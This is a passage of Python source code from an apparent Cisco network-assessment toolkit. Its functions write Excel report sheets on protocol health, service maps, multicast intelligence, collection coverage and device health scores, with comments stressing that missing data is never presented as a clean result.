    for i, w in enumerate([7, 9, 8, 42, 60, 52], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    if not findings:
        ws.cell(2, 1, "No cross-layer correlations found (no compounded L1/L2/L3 risks detected).")
    logger.info(f"  [OK] '{CROSS_LAYER_SHEET_NAME}' sheet: {len(findings)} cross-layer finding(s)")


PROTOCOL_HEALTH_SHEET_NAME = "Protocol Health"

def write_protocol_health_sheet(wb, records: List[dict]) -> None:
    """Write the 'Protocol Health' sheet from compute_protocol_health()."""

    ws = _new_sheet(wb, PROTOCOL_HEALTH_SHEET_NAME)
    headers = ["Switch", "Protocol", "Summary", "Detail", "Health"]
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center")
    word = {"High": "DEGRADED", "Medium": "WARNING", "Low": "MINOR", "Info": "OK"}
    for r, rec in enumerate(records, 2):
        vals = [rec["switch"], rec["protocol"], rec["summary"], rec["detail"],
                word.get(rec["severity"], rec["severity"])]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v)
            if col == 5 and rec["severity"] in _SEV_FILL:
                c.fill = PatternFill("solid", fgColor=_SEV_FILL[rec["severity"]])
                c.font = Font(bold=True)
    for i, w in enumerate([16, 13, 46, 50, 11], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    n_bad = sum(1 for x in records if x["severity"] in ("High", "Medium"))
    logger.info(f"  [OK] '{PROTOCOL_HEALTH_SHEET_NAME}' sheet: {len(records)} row(s), {n_bad} flagged")


PROTOCOL_INTELLIGENCE_SHEET_NAME = "Protocol Intelligence"   # NEW-V3.23.100

def write_protocol_intelligence_sheet(wb, records: List[dict], *, unavailable: bool = False) -> None:
    """Write the 'Protocol Intelligence' sheet from compute_protocol_intelligence(): each abnormal
    protocol state turned into meaning + likely cause + remediation (the observed state is a fact;
    the cause is Inferred per Cisco doctrine)."""
    ws = _new_sheet(wb, PROTOCOL_INTELLIGENCE_SHEET_NAME)
    headers = ["Switch", "Protocol", "State", "Severity", "Meaning",
               "Likely cause (Inferred)", "Remediation"]
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center")
    unavailable = unavailable or (isinstance(records, dict) and bool(records.get("_unavailable")))
    rows = [r for r in (records if isinstance(records, list) else []) if isinstance(r, dict)]
    if unavailable:
        ws.cell(2, 1, "UNVERIFIED - protocol-intelligence computation failed or was unavailable; "
                      "no control-plane health conclusion is asserted.")
    elif not rows:
        ws.cell(2, 1, "No abnormal protocol-state advisory was emitted by this analysis. This is not "
                      "a control-plane health certification; confirm protocol and collection coverage.")
    for r, rec in enumerate(rows, 2):
        vals = [rec["switch"], rec["protocol"], rec["state"], rec["severity"],
                rec["meaning"], rec["likely_cause"], rec["remediation"]]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v)
            c.alignment = Alignment(vertical="top", wrap_text=col >= 5)
            if col == 4 and rec["severity"] in _SEV_FILL:
                c.fill = PatternFill("solid", fgColor=_SEV_FILL[rec["severity"]])
                c.font = Font(bold=True)
    for i, w in enumerate([22, 13, 8, 10, 44, 46, 50], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    n_high = sum(1 for x in rows if x.get("severity") == "High")
    logger.info(f"  [OK] '{PROTOCOL_INTELLIGENCE_SHEET_NAME}' sheet: {len(rows)} advisory row(s), {n_high} High")


SERVICE_MAP_SHEET_NAME = "Service Map"   # NEW-V3.23.101

# The registry's own authority labels (cisco_toolkit/portdb.py). Rendered defensively: absent on snapshots
# produced before the producer published them, in which case no authority claim is made either way.
_SERVICE_AUTHORITY_KEYS = frozenset(("assignment_authoritative", "semantics_authoritative", "overlay_status"))


def service_name_authority(s: dict) -> str:
    """One cell describing how far the registry can VOUCH for this row's service name.

    Coverage-honest: `evidence_class` speaks only to whether traffic was observed. A name carried from the
    curated overlay is a hypothesis about what the port means; saying so at the point of use is what stops
    "Confirmed (ACL hit-counts)" from reading as confirmation of the NAME."""
    if not (_SERVICE_AUTHORITY_KEYS & set(s or {})):
        return ""
    assign = bool(s.get("assignment_authoritative"))
    sem = bool(s.get("semantics_authoritative"))
    status = str(s.get("overlay_status") or "").strip() or "unknown"
    if assign and sem:
        return f"authoritative (port assignment + semantics; overlay {status})"
    if assign:
        return (f"port assignment authoritative; NAME is curated, NOT authoritative "
                f"(overlay {status}) — treat the service label as a hypothesis")
    return (f"NOT authoritative — curated-only classification (overlay {status}); "
            "neither the port assignment nor the name is an assignment of record")


# The SAME three authority keys ride on every MULTICAST group record (analyze._mcast_authority stamps
# them). The multicast axis needs its own wording -- a group's `on_air` / Broadcast-AV flag is derived
# ENTIRELY from the registry's curated category/broadcast fields, so rendering the group's name or its
# on-air flag bare presents a curated judgement as a measurement.
_MCAST_AUTHORITY_KEYS = _SERVICE_AUTHORITY_KEYS


def multicast_class_authority(g: dict) -> str:
    """SHORT authority tag for a multicast group's registry classification.

    The tag qualifies the group's NAME/CATEGORY -- and therefore the `on_air` / Broadcast-AV label
    derived from them, which is what promotes a MAC-alias clash to High. Returns "" when the producer
    publishes no labels at all: absence of the labels is not evidence of authority, so nothing is
    claimed either way (a pre-authority snapshot must not silently acquire a verdict)."""
    if not (_MCAST_AUTHORITY_KEYS & set(g or {})):
        return ""
    status = str(g.get("overlay_status") or "").strip() or "unknown"
    if status == _UNCLASSIFIED_OVERLAY_STATUS:
        return "UNCLASSIFIED — no registry match; the category shown is a placeholder"
    assign = bool(g.get("assignment_authoritative"))
    sem = bool(g.get("semantics_authoritative"))
    if assign and sem:
        return f"registry-authoritative (assignment + media semantics; overlay {status})"
    if sem:
        return f"media semantics authoritative; group assignment curated (overlay {status})"
    return (f"CURATED, NOT authoritative (overlay {status}) — the Broadcast-AV / on-air label is a "
            "hypothesis, not an observation")


def multicast_on_air_cell(g: dict) -> str:
    """The 'On-air' census cell. `on_air` is a curated classification, never a measurement, so the
    cell says which it is at the point of use instead of a bare 'yes'. FAIL-CLOSED: a record whose
    producer never published `on_air_authoritative` reads 'basis NOT published', not 'verified'."""
    if not g or not g.get("on_air"):
        return ""
    if "on_air_authoritative" not in g:
        return "yes — basis NOT published"
    return "yes (registry-verified)" if g.get("on_air_authoritative") else "yes (CURATED, unverified)"


def mac_alias_on_air_cell(a: dict) -> str:
    """The 'On-air involved' cell of a MAC-alias row. `has_av` is what the producer promotes the
    finding to High on, and `has_av` is derived from the curated media classification -- so the cell
    carries its basis. FAIL-CLOSED on a producer that never published `has_av_authoritative`."""
    if not a or not a.get("has_av"):
        return ""
    if "has_av_authoritative" not in a:
        return "yes — basis NOT published"
    return "yes (registry-verified)" if a.get("has_av_authoritative") else "yes (CURATED, unverified)"


def write_service_map_sheet(wb, sm: dict) -> None:
    """Write the 'Service Map' sheet from compute_service_map(): L4 services referenced in ACLs
    (design intent -- Inferred, not active traffic) + fleet multicast activity."""
    ws = _new_sheet(wb, SERVICE_MAP_SHEET_NAME)
    # "Evidence" describes the TRAFFIC evidence (ACL reference vs ACL hit-count) and says nothing about whether
    # the service NAME is authoritative -- a curated-overlay-only name (e.g. 4440/udp "Dante-audio") reached
    # this sheet indistinguishable from an IANA assignment, and an ACL hit then stamped the row "Confirmed".
    # The registry labels every record with its own authority; render it AT THE POINT OF USE. Defensive: the
    # column only appears when the producer actually publishes the labels (older snapshots simply lack them).
    headers = ["Port", "Proto", "Service", "Category", "Broadcast/AV", "ACL refs", "Switches", "Evidence"]
    _svcs0 = (sm or {}).get("services") or []
    _has_auth = any(isinstance(s, dict) and _SERVICE_AUTHORITY_KEYS & set(s) for s in _svcs0)
    if _has_auth:
        headers.append("Name authority")
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center")
    services = (sm or {}).get("services") or []
    r = 2
    if not services:
        ws.cell(r, 1, "No L4 service ports referenced in ACLs (rules are mostly permit-ip source allowlists)."); r += 1
    for s in services:
        vals = [s["port"], s["proto"], s["service"], s["category"], "yes" if s["broadcast"] else "",
                s["refs"], s["host_count"], s["evidence_class"]]
        if _has_auth:
            vals.append(service_name_authority(s))
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v)
            if _has_auth and col == 9 and not s.get("assignment_authoritative"):
                c.font = Font(color="7F6000")   # curated-only: not an assignment of record
        r += 1
    # multicast activity block (Confirmed forwarding presence; per-group classification awaits richer collection)
    mc = (sm or {}).get("multicast") or {}
    r += 1
    ws.cell(r, 1, "Multicast activity").font = Font(bold=True); r += 1
    ws.cell(r, 1, "PIM/mroute-active interfaces"); ws.cell(r, 3, mc.get("active_interfaces", 0)); r += 1
    ws.cell(r, 1, "switches running multicast"); ws.cell(r, 3, mc.get("active_switch_count", 0)); r += 1
    note = ("per-group (S,G) / IGMP membership NOT collected (Unknown) -- re-run with 'show ip igmp groups'"
            if not mc.get("group_level_collected") else "per-group membership collected")
    ws.cell(r, 1, "group-level detail"); ws.cell(r, 3, note); r += 1
    for g in (mc.get("classified_groups") or []):
        # The group NAME/CATEGORY is a registry classification, and on the shipped pack every multicast
        # record is curated-only. Rendered bare it read as an observed property of the fabric; the
        # authority tag travels with it (and "" when the producer publishes no labels -- no claim either way).
        _auth = multicast_class_authority(g)
        ws.cell(r, 1, "multicast group")
        ws.cell(r, 3, f"{g['group']} = {g['name']} ({g['category']})" + (f" — {_auth}" if _auth else ""))
        r += 1
    for i, w in enumerate([8, 8, 16, 14, 12, 9, 9, 52] + ([64] if _has_auth else []), 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{SERVICE_MAP_SHEET_NAME}' sheet: {len(services)} service(s), "
                f"{mc.get('active_interfaces', 0)} multicast iface(s)")


MULTICAST_INTEL_SHEET_NAME = "Multicast Intelligence"   # NEW-V3.23.115 (media-fabric deep-dive)

def write_multicast_intelligence_sheet(wb, mi: dict) -> None:
    """Write 'Multicast Intelligence' from compute_multicast_intelligence(): MAC-address aliasing (RFC 4541),
    IGMP querier coverage, the PTP timing tree (ST 2059), and the per-group media census (with L2 MAC)."""
    if MULTICAST_INTEL_SHEET_NAME in wb.sheetnames:
        del wb[MULTICAST_INTEL_SHEET_NAME]
    ws = _new_sheet(wb, MULTICAST_INTEL_SHEET_NAME)
    m = mi or {}
    s = m.get("summary") or {}
    HDR = Font(bold=True, color="FFFFFF", size=10); HFILL = PatternFill("solid", fgColor="434343")
    DAT = Font(name="Calibri", size=10)
    ws.cell(1, 1, "Multicast / media-fabric intelligence:").font = Font(bold=True, size=10)
    # "N broadcast/AV" alone presents a CURATED classification as a measurement. The producer publishes
    # how many of those on-air labels rest on an authoritative source (0 on the shipped pack) -- pair the
    # two here. FAIL-CLOSED: a snapshot that never published the subset says so rather than reading verified.
    _n_av = s.get("n_av_groups", 0) or 0
    _n_av_auth = s.get("n_av_groups_authoritative")
    if not _n_av:
        _av_txt = f"{_n_av} broadcast/AV"
    elif _n_av_auth is None:
        _av_txt = f"{_n_av} broadcast/AV — classification basis NOT published by this snapshot"
    elif _n_av_auth > _n_av:
        # The two counts are published independently, so nothing guarantees the subtraction is
        # meaningful. Unchecked it printed a NEGATIVE "curated/unverified" count -- a number that
        # cannot exist, in a client workbook. An incoherent pair is a snapshot defect: say that,
        # rather than deriving a third figure from it and presenting the result as a measurement.
        _av_txt = (f"{_n_av} broadcast/AV — census INCOHERENT: {_n_av_auth} reported as "
                   f"registry-authoritative out of {_n_av}; the split cannot be stated")
    elif _n_av_auth:
        _av_txt = (f"{_n_av} broadcast/AV — {_n_av_auth} registry-authoritative, "
                   f"{_n_av - _n_av_auth} curated/unverified")
    else:
        _av_txt = f"{_n_av} broadcast/AV — ALL curated, NOT an authoritative source"
    _n_uncls = s.get("n_unclassified_groups") or 0
    summ = (f"{s.get('n_groups', 0)} group(s) ({_av_txt}) · "
            + (f"{_n_uncls} unclassified (no registry match) · " if _n_uncls else "")
            + f"{s.get('n_mac_clashes', 0)} MAC-alias clash(es) · {s.get('n_querier_gaps', 0)} querier gap(s) · "
            f"{s.get('n_ptp_dormant', 0)}/{s.get('n_ptp_clocks', 0)} PTP dormant · "
            f"{s.get('n_active_interfaces', 0)} mcast iface(s) / {s.get('n_active_switches', 0)} switch(es)")
    c0 = ws.cell(1, 2, summ); c0.font = Font(size=10)
    c0.alignment = Alignment(horizontal="left", wrap_text=True)
    r = [3]   # boxed row counter so the nested helpers can advance it

    def section(title):
        ws.cell(r[0], 1, title).font = Font(bold=True); r[0] += 1

    def header(cols):
        for i, h in enumerate(cols, 1):
            c = ws.cell(r[0], i, h); c.font = HDR; c.fill = HFILL
            c.alignment = Alignment(horizontal="center")
        r[0] += 1

    section("MAC-address aliasing (RFC 4541 — IPv4 multicast is 32:1 into L2 MACs)")
    aliases = m.get("mac_aliases") or []
    if not aliases:
        ws.cell(r[0], 1, "None — no two groups collapse to the same multicast MAC."); r[0] += 1
    else:
        # The producer's own mac-alias risk row carries the severity AND the basis that raised it
        # (analyze.compute_multicast_intelligence: severity_basis / evidence_confidence). Keyed off its
        # title so this sheet never re-derives the promotion rule -- it renders the producer's verdict
        # and the producer's stated basis side by side, which is what stops a High reading as measured.
        _risk_by_mac = {}
        for _rk in (m.get("risks") or []):
            if isinstance(_rk, dict) and _rk.get("kind") == "mac-alias":
                _t = str(_rk.get("title") or "").strip()
                if _t:
                    _risk_by_mac[_t.rsplit(" ", 1)[-1]] = _rk
        header(["L2 MAC", "Overlapping groups", "On-air involved", "Severity",
                "Why this severity (basis of the on-air label)"])
        for a in aliases:
            _rk = _risk_by_mac.get(str(a.get("mac") or ""))
            ws.cell(r[0], 1, a.get("mac")).font = DAT
            ws.cell(r[0], 2, ", ".join(a.get("groups") or [])).font = DAT
            ws.cell(r[0], 3, mac_alias_on_air_cell(a)).font = DAT
            ws.cell(r[0], 4, (_rk or {}).get("severity") or "").font = DAT
            # FAIL-CLOSED: no risk row (older snapshot) => say the basis is unpublished, never leave the
            # severity standing bare as if it were an observed measurement.
            _bc = ws.cell(r[0], 5, (_rk or {}).get("severity_basis")
                          or "severity basis NOT published by this snapshot — do not read the severity as measured")
            _bc.font = DAT
            _bc.alignment = Alignment(vertical="top", wrap_text=True)
            r[0] += 1
    r[0] += 1

    q = m.get("querier") or {}
    section("IGMP querier coverage (RFC 4541)")
    ws.cell(r[0], 1, "Multicast SVI VLANs"); ws.cell(r[0], 3, len(q.get("multicast_vlans") or [])); r[0] += 1
    ws.cell(r[0], 1, "VLANs with a querier"); ws.cell(r[0], 3, q.get("n_querier_vlans", 0)); r[0] += 1
    gaps = q.get("gap_vlans") or []
    ws.cell(r[0], 1, "Multicast VLANs WITHOUT a querier")
    ws.cell(r[0], 3, ", ".join(gaps) if gaps else "none (all covered)"); r[0] += 2

    p = m.get("ptp") or {}
    section("PTP timing tree (SMPTE ST 2059)")
    ws.cell(r[0], 1, "PTP clocks"); ws.cell(r[0], 3, p.get("n_clocks", 0)); r[0] += 1
    ws.cell(r[0], 1, "Operational boundary clocks"); ws.cell(r[0], 3, p.get("n_operational", 0)); r[0] += 1
    ws.cell(r[0], 1, "Dormant (not boundary-clocked)"); ws.cell(r[0], 3, p.get("n_dormant", 0)); r[0] += 1
    gms = p.get("grandmasters") or []
    ws.cell(r[0], 1, "Grandmaster(s)"); ws.cell(r[0], 3, ", ".join(gms) if gms else "none observed"); r[0] += 2

    section(f"Group census ({len(m.get('groups') or [])})")
    # The census columns stay at SIX (the sheet's row-1 width is pinned by tests/golden/sheet_schema.json),
    # so the classification authority rides IN the Category cell rather than in a seventh column -- the
    # category and the authority that vouches for it are the same claim, and must not be readable apart.
    header(["Group", "L2 MAC", "Category (classification authority)", "On-air (basis)", "Source", "Name"])
    for g in (m.get("groups") or []):
        _auth = multicast_class_authority(g)
        vals = [g.get("group"), g.get("mac"),
                str(g.get("category") or "") + (f" — {_auth}" if _auth else ""),
                multicast_on_air_cell(g), g.get("source"), g.get("name")]
        for i, v in enumerate(vals, 1):
            ws.cell(r[0], i, v).font = DAT
        r[0] += 1

    # One width set serves both tables on this sheet (E carries the alias severity-basis sentence).
    for i, w in enumerate([20, 24, 44, 26, 40, 26], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{MULTICAST_INTEL_SHEET_NAME}' sheet: {s.get('n_groups', 0)} group(s), "
                f"{s.get('n_mac_clashes', 0)} MAC clash(es), {s.get('n_querier_gaps', 0)} querier gap(s)")


COVERAGE_SCHEMA_SHEET_NAME = "Coverage Schema"   # J3: the per-section coverage census (SuzieQ `describe` analog)

# The per-state cell fill: a blind spot (not_collected) is RED, an empty-but-collected section is
# AMBER (collected, nothing found — NOT a blind spot), a published section is GREEN. Coverage-honest
# palette — an absent axis can never render as a clean/green result.
_CENSUS_STATE_FILL = {
    "published": "D9EAD3",             # green — seen
    "collected_but_empty": "FFF2CC",   # amber — collected, nothing of this kind found
    "not_collected": "F4CCCC",         # red — blind spot
}


def write_coverage_schema_sheet(wb, census: dict) -> None:
    """Write the 'Coverage Schema' sheet from ssot.compute_schema_census() — the snapshot's own
    per-section coverage census (a SuzieQ `describe` analog). One row per top-level snapshot
    section: its coverage-honest 3-state (published / collected_but_empty / not_collected), its
    structural kind + cardinality, and an honest note. COVERAGE-HONEST: an EMPTY section reads
    'collected, nothing found' (amber — NOT a blind spot); an ABSENT section reads 'blind spot —
    not collected' (red). Nothing renders as 'ok'/'healthy' — absence of evidence is never health.

    This is the map that answers, for an access-only collection, exactly what was SEEN vs what is a
    blind spot (the real cause of a 'filler'-feeling output is an uncollected tier, not a code
    bug)."""
    c = census if isinstance(census, dict) else {}
    ws = _new_sheet(wb, COVERAGE_SCHEMA_SHEET_NAME)
    summ = c.get("summary") or {}
    # Row 1: a STATIC coverage-honesty caveat. The live roll-up counts deliberately do NOT live here —
    # a header cell that carries data-dependent counts would churn the frozen sheet-schema golden on
    # every new section and desensitise the additive-only shrink guard (it cried wolf on the very next
    # axis added). The counts live in the '(all sections)' TOTALS data row below instead.
    caveat = ("Per-section coverage census — what this snapshot actually SAW: published (green) · "
              "collected-but-empty (amber) · NOT collected = a blind spot (red). "
              "An absent axis is a blind spot, never a clean result.")
    c0 = ws.cell(1, 1, caveat)
    c0.font = Font(italic=True, color="666666"); ws.merge_cells("A1:E1")
    for col, h in enumerate(["Section", "State", "Kind", "Count", "Note"], 1):
        cell = ws.cell(2, col, h); cell.font = Font(bold=True, color="FFFFFF")
        cell.fill = PatternFill("solid", fgColor="434343"); cell.alignment = Alignment(horizontal="center")
    # Row 3: the roll-up as DATA (not a frozen header cell) — the counts stay in the sheet while the
    # structural header (row 1) stays byte-stable across section additions.
    ws.cell(3, 1, "(all sections)").font = Font(bold=True)
    ws.cell(3, 3, "summary")
    ws.cell(3, 4, summ.get("n_sections", 0))
    ws.cell(3, 5, (f"published {summ.get('n_published', 0)} · collected-but-empty "
                   f"{summ.get('n_collected_but_empty', 0)} · NOT collected "
                   f"{summ.get('n_not_collected', 0)} (blind spots)")).font = Font(bold=True)
    r = 4
    for row in (c.get("sections") or []):
        state = str(row.get("state") or "")
        ws.cell(r, 1, row.get("key", ""))
        st_cell = ws.cell(r, 2, state)
        ws.cell(r, 3, row.get("kind", ""))
        cnt = row.get("count")
        ws.cell(r, 4, cnt if cnt is not None else "—")   # scalar/absent has no cardinality
        ws.cell(r, 5, row.get("note", ""))
        fill = _CENSUS_STATE_FILL.get(state)
        if fill:
            st_cell.fill = PatternFill("solid", fgColor=fill); st_cell.font = Font(bold=True)
        r += 1
    if r == 4:
        ws.cell(4, 1, "No sections — snapshot carried no top-level evidence blocks.").font = Font(italic=True)
    for i, w in enumerate([26, 20, 8, 8, 56], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A3"
    logger.info(f"  [OK] '{COVERAGE_SCHEMA_SHEET_NAME}' sheet: "
                f"{summ.get('n_published', 0)} seen / {summ.get('n_collected_but_empty', 0)} empty / "
                f"{summ.get('n_not_collected', 0)} blind of {summ.get('n_sections', 0)} section(s)")


COLLECTION_COMPLETENESS_SHEET_NAME = "Collection Completeness"   # NEW-V3.23.109

def write_collection_completeness_sheet(wb, cc: dict, parse_yield: Optional[dict] = None) -> None:
    """Write the 'Collection Completeness' sheet from compute_collection_completeness(): the
    pre-assessment blind-spot list -- inventory devices that were not collected / only partially
    collected, and which essential commands are missing. Lead row is the summary.

    Plan A / Tier-1 #3: a PARSE YIELD section follows the device rows — commands that returned
    real content but whose parser produced 0 entities (collected-but-unparsed evidence; a
    possible platform-variant format gap, NEVER a device verdict). Appended BELOW the existing
    layout so the frozen sheet-schema header row is untouched."""
    ws = _new_sheet(wb, COLLECTION_COMPLETENESS_SHEET_NAME)
    s = (cc or {}).get("summary") or {}
    ws.cell(1, 1, "Inventory").font = Font(bold=True)
    ws.cell(1, 2, s.get("inventory", 0))
    ws.cell(1, 3, f"complete {s.get('complete', 0)} · partial {s.get('partial', 0)} · "
                  f"NOT collected {s.get('not_collected', 0)} — these are assessment blind spots, "
                  "re-collect before relying on the report").font = Font(italic=True)
    headers = ["Status", "Device", "Data quality", "Missing essential commands"]
    for col, h in enumerate(headers, 1):
        c = ws.cell(3, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center")
    fill = {"not collected": "F4CCCC", "partial": "FCE5CD"}
    rows = (cc or {}).get("devices") or []
    if not rows:
        ws.cell(4, 1, "All inventory devices fully collected — no blind spots.")
    for r, d in enumerate(rows, 4):
        vals = [d.get("status", ""), d.get("host", ""), f"{d.get('data_quality', 0)}%",
                ", ".join(d.get("missing", []))]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v)
            if col == 1 and d.get("status") in fill:
                c.fill = PatternFill("solid", fgColor=fill[d["status"]])
                c.font = Font(bold=True)

    # --- Parse Yield (zero-parse telemetry) — below the device rows, schema-neutral ---
    py = parse_yield or {}
    ps = py.get("summary") or {}
    events = py.get("events") or []
    mbe = {n for n, c in (py.get("per_parser") or {}).items()
           if isinstance(c, dict) and c.get("may_be_empty")}
    r0 = 3 + max(len(rows), 1) + 2
    t = ws.cell(r0, 1, "Parse Yield — content in, 0 entities out")
    t.font = Font(bold=True)
    ws.cell(r0, 3, f"suspect {ps.get('zero_yield_suspect', 0)} · expected-empty "
                   f"{ps.get('zero_yield_expected', 0)} · parser errors {ps.get('parse_errors', 0)} — "
                   "collected-but-unparsed evidence (possible parser format gap), "
                   "NEVER a device health verdict").font = Font(italic=True)
    sub = ["Class", "Parser", "Device", "Command", "Lines in"]
    for col, h in enumerate(sub, 1):
        c = ws.cell(r0 + 1, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
    if not events:
        ws.cell(r0 + 2, 1, f"None — {ps.get('parsers_called', 0)} parser(s) ran; every "
                           "content-bearing command yielded entities (or is expected-empty).")
    r = r0 + 2
    for ev in events:
        klass = ("parser ERROR" if ev.get("error")
                 else "expected-empty" if ev.get("parser") in mbe
                 else "SUSPECT format gap")
        vals = [klass, ev.get("parser", ""), ev.get("device", ""), ev.get("cmd", ""),
                ev.get("lines_in", "")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v)
            if col == 1 and klass != "expected-empty":
                c.fill = PatternFill("solid", fgColor="F4CCCC")
                c.font = Font(bold=True)
        r += 1
    if py.get("events_truncated"):
        ws.cell(r, 1, "… event list truncated at the cap — per-parser counters above carry "
                      "the full counts").font = Font(italic=True)

    # widths serve BOTH stacked sections (Status/Class, Device/Parser, quality/Device,
    # missing-commands/Command, -/Lines-in) — D keeps the original 46 for the long lists
    for i, w in enumerate([21, 34, 24, 46, 10], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A4"
    logger.info(f"  [OK] '{COLLECTION_COMPLETENESS_SHEET_NAME}' sheet: {len(rows)} blind spot(s) "
                f"of {s.get('inventory', 0)} inventory device(s); parse-yield suspects: "
                f"{ps.get('zero_yield_suspect', 0)}")


HEALTH_SCORES_SHEET_NAME = "Health Scores"

#: What the Score column shows for a device banded "Insufficient Data". A number there is a claim
#: about the device; this is the absence-is-not-health marker used across the deliverables.
HEALTH_NOT_OBSERVED = "[NOT OBSERVED]"
MIGRATION_READINESS_SHEET_NAME = "Migration Readiness"
SCORE_SENSITIVITY_SHEET_NAME = "Score Sensitivity"   # NEW-V3.23.5
_READY_FILL = {"READY": "36E08A", "CAUTION": "FFE566", "NOT READY": "FF5775"}
_STATUS_FILL = {"pass": "36E08A", "warn": "FFE566", "fail": "FF5775"}

def write_health_scores_sheet(wb, records: List[dict]) -> None:
    ws = _new_sheet(wb, HEALTH_SCORES_SHEET_NAME)
    headers = ["Switch", "Score", "Band", "Criticality", "Data Quality", "Top Deductions"]
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center")
    for r, rec in enumerate(records, 2):
        _lbl, fill = _health_band(rec["score"])
        # `Insufficient Data` means the device was never really assessed (collection gap, or an
        # interface parse that yielded nothing). compute_health_scores computes `score` and
        # `deductions` BEFORE it overrides the band, so such a record arrives here carrying score=100
        # and deductions=[] -- and the old render printed exactly that plus the literal word
        # "healthy", behind nothing but a grey fill. An engineer sorting by Score then saw the
        # never-collected devices ranked as the fleet's HEALTHIEST assets and de-scoped them. The
        # score is not a finding about the device; suppress it rather than print a fabricated 100.
        insufficient = rec.get("band") == "Insufficient Data"
        if insufficient:                                      # NEW-V3.23.7: neutral grey, not green
            fill = "B0B0B0"
        ws.cell(r, 1, rec["switch"])
        c = ws.cell(r, 2, HEALTH_NOT_OBSERVED if insufficient else rec["score"])
        c.fill = PatternFill("solid", fgColor=fill); c.font = Font(bold=True)
        c2 = ws.cell(r, 3, rec["band"]); c2.fill = PatternFill("solid", fgColor=fill)
        role = rec.get("role"); crit = rec.get("criticality")   # asset-criticality weighting (transparency)
        ws.cell(r, 4, f"{role} x{crit:g}" if role else "")
        dq = rec.get("data_quality")
        ws.cell(r, 5, "" if dq is None else f"{int(round(dq * 100))}%")
        if insufficient:
            ws.cell(r, 6, "not scored - insufficient collection; absence of findings here is a "
                          "blind spot, NOT a clean result")
        else:
            ws.cell(r, 6, "; ".join(rec["deductions"]) if rec["deductions"] else "healthy")
    for i, w in enumerate([16, 8, 11, 15, 13, 80], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    # Average the SCORED devices only. An unassessed device carries a fabricated 100, so including it
    # pulled the fleet average UP in proportion to how much of the fleet was never collected.
    scored = [r for r in records if r.get("band") != "Insufficient Data"]
    avg = round(sum(r["score"] for r in scored) / len(scored)) if scored else 0
    n_blind = len(records) - len(scored)
    logger.info(f"  [OK] '{HEALTH_SCORES_SHEET_NAME}' sheet: {len(records)} switch(es), avg score "
                f"{avg} over the {len(scored)} scored"
                + (f" ({n_blind} not scored - insufficient collection)" if n_blind else ""))

def write_score_sensitivity_sheet(wb, records: List[dict]) -> None:
    """Write the 'Score Sensitivity' sheet from compute_score_sensitivity()."""
    ws = _new_sheet(wb, SCORE_SENSITIVITY_SHEET_NAME)
    headers = ["Perturbation", "Switches Changing Band", "Detail"]
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center")
    for r, rec in enumerate(records, 2):
        ws.cell(r, 1, rec["perturbation"])
        c = ws.cell(r, 2, rec["switches_changed_band"])
        if rec["switches_changed_band"]:
            c.font = Font(bold=True)
        ws.cell(r, 3, rec["detail"])
    for i, w in enumerate([20, 24, 80], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    flips = sum(1 for r in records if r["switches_changed_band"])
    logger.info(f"  [OK] '{SCORE_SENSITIVITY_SHEET_NAME}' sheet: {len(records)} perturbation(s), {flips} with band changes")


SCORE_CALIBRATION_SHEET_NAME = "Score Calibration"   # NEW-V3.23.47

def write_calibration_sheet(wb, report: dict) -> None:
    """Write the 'Score Calibration' sheet from compute_calibration_report() -- a
    fleet-level key/value diagnostic (band distribution, score spread, discrimination,
    and a quantile re-banding suggestion when the bands don't discriminate)."""
    ws = _new_sheet(wb, SCORE_CALIBRATION_SHEET_NAME)
    for col, h in enumerate(["Metric", "Value"], 1):
        c = ws.cell(1, col, h)
        c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center")
    n = report.get("n", 0)
    rows: List[Tuple[str, object]] = [("Switches scored", n)]
    if n:
        st = report.get("score_stats", {})
        rows += [
            ("Score range", f"{st.get('min', '')}-{st.get('max', '')}"),
            ("Median / Mean", f"{st.get('median', '')} / {st.get('mean', '')}"),
            ("Std dev", st.get("stdev", "")),
            ("p25 / p75", f"{st.get('p25', '')} / {st.get('p75', '')}"),
            ("Band distribution", "  ".join(f"{d['band']}:{d['count']} ({d['pct']}%)"
                                            for d in report.get("band_distribution", []))),
            ("Modal band", f"{report.get('modal_band', '')} ({report.get('modal_pct', 0)}%)"),
            ("Discrimination", f"{report.get('discrimination', '')} ({report.get('discrimination_quality', '')})"),
        ]
